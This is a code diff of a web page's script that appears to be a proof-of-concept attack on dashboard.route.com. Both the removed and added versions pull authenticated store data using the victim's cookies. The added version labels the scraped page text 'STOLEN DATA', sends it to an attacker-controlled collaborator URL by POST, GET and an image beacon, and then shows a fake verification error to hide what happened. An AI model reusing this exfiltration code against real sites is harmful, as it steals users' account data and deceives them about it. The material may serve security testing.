@@ -20,44 +20,57 @@
                 return;
             }
             
-            // Fetch API
-            fetch('https://dashboard.route.com/api/mn/v1/stores', {
-                method: 'GET',
-                credentials: 'include',
-                mode: 'cors'
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Alert the response
-                alert('STOLEN DATA:\n\n' + data);
-                
-                // Send to collaborator
-                sendToCollab(data, COLLAB);
-                
-                alert('Data sent to: ' + COLLAB);
-            })
-            .catch(err => {
-                alert('Error: ' + err.message + '\n\nMake sure you are logged in to dashboard.route.com');
-            });
+            // Store collaborator URL in sessionStorage so the API page can access it
+            sessionStorage.setItem('collabURL', COLLAB);
+            
+            // Redirect to API (this sends cookies because it's top-level navigation)
+            window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
         }
 
-        function sendToCollab(data, collab) {
-            // Method 1: POST
-            fetch(collab, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: data
-            });
+        // ===== AUTO-CAPTURE WHEN ON API PAGE =====
+        if (window.location.hostname === 'dashboard.route.com' && 
+            window.location.pathname.includes('/api/')) {
             
-            // Method 2: GET
-            fetch(collab + '?data=' + encodeURIComponent(data), {
-                mode: 'no-cors'
-            });
+            // Get the stolen data
+            var stolenData = document.body.innerText || document.body.textContent;
             
-            // Method 3: Image
-            new Image().src = collab + '/img?d=' + encodeURIComponent(data.substring(0, 500));
+            // Get collaborator URL from sessionStorage
+            var collabURL = sessionStorage.getItem('collabURL');
             
-            console.log('Data sent to:', collab);
+            if (!collabURL) {
+                alert('ERROR: No collaborator URL found. Please restart the attack.');
+            } else {
+                // ALERT 1: Show stolen data
+                alert('STOLEN DATA:\n\n' + stolenData);
+                
+                // Send to collaborator
+                // Method 1: POST
+                fetch(collabURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: stolenData
+                }).catch(e => console.log('POST failed:', e));
+                
+                // Method 2: GET
+                fetch(collabURL + '?data=' + encodeURIComponent(stolenData), {
+                    mode: 'no-cors'
+                }).catch(e => console.log('GET failed:', e));
+                
+                // Method 3: Image
+                var img = new Image();
+                img.src = collabURL + '/img?d=' + encodeURIComponent(stolenData.substring(0, 1000));
+                
+                // ALERT 2: Confirm sent
+                setTimeout(function() {
+                    alert('Data sent to: ' + collabURL + '\n\nCheck your collaborator now!');
+                    
+                    // Clear sessionStorage
+                    sessionStorage.removeItem('collabURL');
+                    
+                    // Show fake error
+                    document.body.innerHTML = '<div style="padding:100px;text-align:center;"><h1>Error</h1><p>Verification failed. Please try again later.</p><a href="https://route.com">Return to Route.com</a></div>';
+                }, 500);
+            }
         }
     </script>
 </body>
